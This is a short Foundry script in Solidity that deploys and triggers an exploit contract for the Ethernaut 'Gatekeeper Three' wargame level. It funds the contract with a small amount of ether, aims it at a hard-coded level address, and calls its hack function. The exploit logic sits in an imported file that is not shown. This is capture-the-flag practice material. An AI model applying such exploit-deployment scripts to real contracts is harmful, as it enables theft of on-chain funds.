// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {GatekeeperThreeHack} from "ethernaut/gatekeeper_three_hack.sol";
import "forge-std/console.sol";

contract GatekeeperThreeHackScript is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        GatekeeperThreeHack gatekeeperThreeHack = new GatekeeperThreeHack{value: 0.0011 ether}(0xfd1ec136360103Fc13d34158bAa4Fe1C1A10988f);
        gatekeeperThreeHack.hack();
        vm.stopBroadcast();
    }
}